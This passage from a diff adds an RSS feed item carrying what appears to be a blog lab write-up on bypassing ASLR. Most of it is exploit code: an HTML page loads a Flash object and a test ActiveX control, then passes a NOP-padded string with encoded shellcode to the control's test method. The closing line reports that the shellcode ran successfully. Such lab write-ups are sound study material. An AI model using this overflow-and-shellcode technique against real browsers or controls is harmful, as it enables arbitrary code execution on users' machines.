+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">object&lt;/span> &lt;span class="na">classid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;#34;&lt;/span> &lt;span class="na">codebase&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&amp;#34;&lt;/span> &lt;span class="na">width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;160&amp;#34;&lt;/span> &lt;span class="na">height&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;260&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">param&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;movie&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;1.swf&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">param&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;quality&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;high&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">embed&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;1.swf&amp;#34;&lt;/span> &lt;span class="na">quality&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;high&amp;#34;&lt;/span> &lt;span class="na">pluginspage&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&amp;#34;&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;application/x-shockwave-flash&amp;#34;&lt;/span> &lt;span class="na">width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;160&amp;#34;&lt;/span> &lt;span class="na">height&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;260&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">embed&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">object&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">object&lt;/span> &lt;span class="na">classid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;test&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">object&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">54&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u42F2\u3009&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u9090\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>As shown in the picture, reboot the system, the shellcode runs normally, which means the attack on ASLR is successful&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/shellcode%20run%20successfully.png"
+loading="lazy"
+alt="shellcode run successfully"
+>&lt;/p></description></item></channel></rss>
